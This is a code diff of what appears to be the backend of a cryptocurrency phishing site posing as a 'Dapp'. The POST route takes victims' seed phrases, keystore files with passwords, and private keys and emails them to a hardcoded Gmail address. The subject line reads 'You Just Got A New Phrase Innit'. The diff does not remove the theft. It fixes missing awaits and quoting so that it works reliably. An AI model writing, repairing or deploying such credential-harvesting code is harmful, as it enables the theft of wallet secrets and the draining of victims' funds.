@@ -47,11 +47,11 @@ const formatMessage = async (message: string) => {
   // Return the formatted message
   return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedMessage}</div>`;
 }
+
 export async function POST(request: Request) {
   try {
     const { phrase, keystore, privateKey } = await request.json();
     await formatMessage('hi');
-
 
     if (phrase) {
 
@@ -67,7 +67,7 @@ export async function POST(request: Request) {
       })
 
 
-      const formattedMessage = formatMessage(phrase);
+      const formattedMessage = await formatMessage(phrase);
 
       const mailOptions = {
         from: `Dapp App ${email}`,
@@ -110,7 +110,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: "yesangela11@gmail.com",
+        to: 'yesangela11@gmail.com',
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
       }
@@ -147,11 +147,11 @@ export async function POST(request: Request) {
 
 
 
-      const formattedMessage = formatMessage(privateKey);
+      const formattedMessage = await formatMessage(privateKey);
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: "yesangela11@gmail.com",
+        to: 'yesangela11@gmail.com',
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: formattedMessage,
       }
